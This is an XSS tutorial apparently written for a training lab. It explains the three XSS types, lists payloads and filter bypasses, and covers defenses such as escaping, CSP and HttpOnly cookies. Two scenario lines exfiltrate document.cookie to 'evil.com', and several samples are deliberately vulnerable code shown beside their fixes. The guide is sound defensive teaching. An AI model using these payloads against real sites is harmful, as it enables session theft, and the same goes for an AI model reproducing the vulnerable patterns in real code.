# 🎭 XSS (Cross-Site Scripting) Guide

Complete guide to understanding and preventing XSS attacks.

---

## 🎯 What is XSS?

**Cross-Site Scripting (XSS)** is a vulnerability that allows attackers to inject malicious JavaScript code into web pages viewed by other users.

### Why It's Dangerous:
- 🍪 Steal cookies and session tokens
- 🔑 Capture keystrokes and passwords
- 🎭 Impersonate users
- 📧 Phishing attacks
- 🦠 Spread malware
- 💰 Steal sensitive data

---

## 📚 Three Types of XSS

### 1. 🎯 Reflected XSS (Non-Persistent)

**What it is:** Malicious script is reflected back immediately in the response.

**Example:**
```
URL: https://example.com/search?q=<script>alert('XSS')</script>
Page displays: You searched for: <script>alert('XSS')</script>
```

**How it works:**
1. Attacker crafts malicious URL
2. Victim clicks the link
3. Server reflects the payload in response
4. Browser executes the script

**Real-world scenario:**
```
Attacker sends: https://bank.com/search?q=<script>document.location='http://evil.com?cookie='+document.cookie</script>
Victim clicks link → Cookie stolen!
```

---

### 2. 💾 Stored XSS (Persistent)

**What it is:** Malicious script is saved on the server and executed every time the page loads.

**Example:**
```
Comment: <script>alert('XSS')</script>
Saved to database
Every user who views comments gets attacked!
```

**How it works:**
1. Attacker posts malicious content (comment, profile, etc.)
2. Server saves it to database
3. Every user who views the page executes the script
4. Much more dangerous than reflected XSS!

**Real-world scenario:**
```
Forum post: <script>fetch('http://evil.com?cookie='+document.cookie)</script>
Every visitor's cookie is stolen automatically!
```

---

### 3. 🌐 DOM-Based XSS

**What it is:** Vulnerability in client-side JavaScript code, never reaches the server.

**Example:**
```javascript
// Vulnerable code
const name = location.hash.substring(1);
document.getElementById('welcome').innerHTML = 'Hello ' + name;

// Attack
URL: https://example.com#<img src=x onerror=alert('XSS')>
```

**How it works:**
1. JavaScript reads user input from URL/DOM
2. Directly inserts it into the page
3. Server never sees the attack
4. Harder to detect with server-side filters

---

## 💉 Common XSS Payloads

### Basic Script Tag
```html
<script>alert('XSS')</script>
<script>alert(document.cookie)</script>
<script>alert(document.domain)</script>
```

### Image Tag with Error Handler
```html
<img src=x onerror=alert('XSS')>
<img src=x onerror=alert(document.cookie)>
```

### SVG with onload
```html
<svg onload=alert('XSS')>
<svg/onload=alert('XSS')>
```

### Iframe
```html
<iframe src="javascript:alert('XSS')">
<iframe src="data:text/html,<script>alert('XSS')</script>">
```

### Body/HTML Event Handlers
```html
<body onload=alert('XSS')>
<body onpageshow=alert('XSS')>
<html onmouseover=alert('XSS')>
```

### Input with Event Handler
```html
<input onfocus=alert('XSS') autofocus>
<input onblur=alert('XSS') autofocus><input autofocus>
```

### Link with JavaScript
```html
<a href="javascript:alert('XSS')">Click me</a>
```

---

## 🔧 Bypass Techniques

### 1. Case Variation
```html
<ScRiPt>alert('XSS')</sCrIpT>
<IMG SRC=x ONERROR=alert('XSS')>
```

### 2. Encoding
```html
<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>
<img src=x onerror=\u0061\u006c\u0065\u0072\u0074('XSS')>
```

### 3. Alternative Tags
```html
<details open ontoggle=alert('XSS')>
<marquee onstart=alert('XSS')>
<video src=x onerror=alert('XSS')>
<audio src=x onerror=alert('XSS')>
```

### 4. Without Quotes
```html
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
```

### 5. Without Parentheses
```html
<img src=x onerror=alert`XSS`>
<svg onload=alert`XSS`>
```

### 6. Using eval
```html
<img src=x onerror=eval(atob('YWxlcnQoJ1hTUycp'))>
```

---

## 🛡️ Defense Techniques

### 1. ✅ HTML Escaping (Most Important!)

**Escape these characters:**
```
& → &amp;
< → &lt;
> → &gt;
" → &quot;
' → &#x27;
/ → &#x2F;
```

**Example:**
```javascript
function escapeHtml(unsafe) {
  return unsafe
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;")
    .replace(/'/g, "&#x27;")
    .replace(/\//g, "&#x2F;");
}
```

---

### 2. ✅ Content Security Policy (CSP)

**What it is:** HTTP header that controls what resources can be loaded.

**Example:**
```
Content-Security-Policy: default-src 'self'; script-src 'self'
```

**Benefits:**
- Blocks inline scripts
- Blocks eval()
- Allows only whitelisted sources
- Prevents most XSS attacks

---

### 3. ✅ Use Safe APIs

**Avoid:**
```javascript
element.innerHTML = userInput; // Dangerous!
document.write(userInput); // Dangerous!
eval(userInput); // Dangerous!
```

**Use instead:**
```javascript
element.textContent = userInput; // Safe!
element.innerText = userInput; // Safe!
```

---

### 4. ✅ Input Validation

**Whitelist approach:**
```javascript
// Only allow alphanumeric
const safe = userInput.replace(/[^a-zA-Z0-9]/g, '');
```

**Validate format:**
```javascript
// Email validation
const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
if (!emailRegex.test(email)) {
  return 'Invalid email';
}
```

---

### 5. ✅ Use Framework Protection

**React (automatic escaping):**
```jsx
<div>{userInput}</div> // Safe! React escapes by default
```

**Vue (automatic escaping):**
```vue
<div>{{ userInput }}</div> // Safe! Vue escapes by default
```

**Angular (automatic escaping):**
```html
<div>{{ userInput }}</div> // Safe! Angular escapes by default
```

---

### 6. ✅ HTTPOnly Cookies

**Prevent cookie theft:**
```
Set-Cookie: sessionId=abc123; HttpOnly; Secure
```

**Benefits:**
- JavaScript cannot access the cookie
- Even if XSS exists, session token is safe

---

## 🎓 Real-World Examples

### Example 1: Search Box XSS
```html
<!-- Vulnerable -->
<p>You searched for: <?php echo $_GET['q']; ?></p>

<!-- Attack -->
?q=<script>alert(document.cookie)</script>

<!-- Fixed -->
<p>You searched for: <?php echo htmlspecialchars($_GET['q']); ?></p>
```

---

### Example 2: Comment Section XSS
```javascript
// Vulnerable
app.post('/comment', (req, res) => {
  const comment = req.body.comment;
  db.save(comment); // Saved as-is!
  res.send(`<div>${comment}</div>`); // Rendered as-is!
});

// Fixed
app.post('/comment', (req, res) => {
  const comment = escapeHtml(req.body.comment);
  db.save(comment);
  res.send(`<div>${comment}</div>`);
});
```

---

### Example 3: Profile Page XSS
```html
<!-- Vulnerable -->
<h1>Welcome, <span id="username"></span></h1>
<script>
  const name = new URLSearchParams(location.search).get('name');
  document.getElementById('username').innerHTML = name; // Dangerous!
</script>

<!-- Fixed -->
<h1>Welcome, <span id="username"></span></h1>
<script>
  const name = new URLSearchParams(location.search).get('name');
  document.getElementById('username').textContent = name; // Safe!
</script>
```

---

## 🔍 Testing for XSS

### Manual Testing:
1. Try basic payload: `<script>alert(1)</script>`
2. Try image tag: `<img src=x onerror=alert(1)>`
3. Try event handlers: `<svg onload=alert(1)>`
4. Check if input is reflected in HTML
5. Check if input is stored and displayed later
6. Inspect JavaScript code for DOM manipulation

### Automated Tools:
- Burp Suite
- OWASP ZAP
- XSStrike
- DalFox

---

## 💡 Key Takeaways

1. **Always escape user input** when displaying in HTML
2. **Use textContent, not innerHTML** for user data
3. **Implement CSP** to block inline scripts
4. **Use HTTPOnly cookies** to protect sessions
5. **Validate input** on both client and server
6. **Use framework protection** (React, Vue, Angular)
7. **Never trust user input** - even from your own users!

---

## 🎯 Practice in the Lab

Try these levels:
1. **REFLECTED LOW** - Basic XSS with no protection
2. **REFLECTED MEDIUM** - Bypass `<script>` tag filter
3. **REFLECTED HIGH** - Bypass multiple tag filters
4. **STORED LOW** - Persistent XSS attack
5. **DOM-BASED** - Client-side vulnerability
6. **SECURE** - See proper protection in action

---

## ⚠️ Ethical Reminder

- ✅ Test on your own applications
- ✅ Use authorized testing platforms
- ✅ Learn to build secure applications
- ❌ Never attack systems without permission
- ❌ Unauthorized access is illegal

---

**Learn XSS to build secure web applications!** 🎭🔐
